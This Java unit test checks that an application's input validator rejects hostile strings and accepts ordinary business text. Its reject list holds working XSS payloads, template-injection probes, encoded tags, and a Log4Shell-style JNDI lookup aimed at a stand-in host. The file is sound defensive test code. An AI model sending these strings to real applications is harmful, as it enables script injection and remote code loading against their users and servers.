package com.tinqa.procurement.common.validation;

import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;

class InputSafetyTest {

    @ParameterizedTest
    @ValueSource(strings = {
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "< svg/onload=alert(1)>", "</div>", "<!-- x -->",
            "javascript:alert(1)", "JaVaScRiPt :alert(1)", "vbscript:msgbox", "data:text/html;base64,PHNjcmlwdD4=",
            "x\" onmouseover=\"alert(1)", "onfocus = steal()", "&#60;script&#62;", "&#x3c;img", "&lt;b&gt;", "%3Cscript%3E",
            "${jndi:ldap://evil/a}", "#{7*7}", "{{constructor.constructor('x')()}}", "width:expression(alert(1))",
            "null\u0000byte", "bell\u0007", "visit https://evil.example/login", "go to www.evil-bank.com now", "ftp://x/y"
    })
    void rejectsScriptsMarkupEncodedPayloadsAndLinks(String input) {
        assertNotNull(InputSafety.findViolation(input), input);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Summit X Mother Board", "O'Brien-Smith", "#12, 3rd Cross, Indiranagar", "Weight > 5 kg and < 10 kg",
            "50% discount (limited)", "R&D / QA", "Line one\nLine two\ttabbed", "admin@tinqa.com", "Sector-62, Noida",
            "Price: ₹1,200.50", "कुशीनगर", "one = 1", "Online = yes", "money"
    })
    void acceptsOrdinaryBusinessText(String input) {
        assertNull(InputSafety.findViolation(input), input);
    }

    @ParameterizedTest
    @ValueSource(strings = {"https://maps.app.goo.gl/abc123", "https://www.google.com/maps/place/Noida"})
    void linksAreAllowedOnlyWhereRequested(String link) {
        assertNotNull(InputSafety.findViolation(link));
        assertNull(InputSafety.findViolation(link, true));
    }

    @ParameterizedTest
    @ValueSource(strings = {"javascript:alert(1)", "https://x.com/<script>"})
    void urlFieldsStillRejectScripts(String link) {
        assertNotNull(InputSafety.findViolation(link, true));
    }
}
